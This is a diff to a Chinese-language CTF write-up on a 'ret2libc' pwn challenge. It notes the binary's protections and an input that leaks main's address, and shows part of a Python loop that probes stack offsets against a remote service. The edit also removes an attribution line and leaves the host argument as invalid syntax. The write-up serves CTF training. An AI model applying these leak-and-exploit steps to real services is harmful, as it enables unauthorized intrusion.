@@ -1,7 +1,5 @@
 # ret2libc 
 
-From 0rays.
-
 ## 文件分析
 
 下载`ret2libc`, NX on, PIE on, RELRO full  
@@ -19,7 +17,7 @@ main函数中先是scan了一个int，可以利用它来*泄露main的地址*以
 
 ```python
 for offset in range(8, 128, 8):
-    sh = remote("???", 10022)
+    sh = remote(???, 10022)
     sh.sendline(str(offset).encode())
     data = sh.recvline()
     data = sh.recvuntil(b'sh')
